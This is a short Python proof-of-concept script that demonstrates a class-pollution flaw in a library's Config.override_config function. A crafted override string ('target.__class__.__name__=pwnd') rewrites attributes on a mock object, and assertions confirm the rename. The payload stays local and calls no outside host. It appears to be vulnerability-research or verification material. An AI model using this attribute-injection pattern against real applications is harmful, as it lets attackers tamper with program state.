# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Config.override_config
# Type: get-attr-set-both

from fixlib.config import Config
from fixlib.args import ArgumentParser

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = ["target.__class__.__name__=pwnd"]

class MockRunningConfig:
  def __init__(self):
    self.data = self
    self.types = {}
    self.target = target

def run_poc():
  ArgumentParser.args = type("Args", (), {"config_override": PAYLOAD})()
  Config.running_config = MockRunningConfig()
  Config.override_config(MockRunningConfig())

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
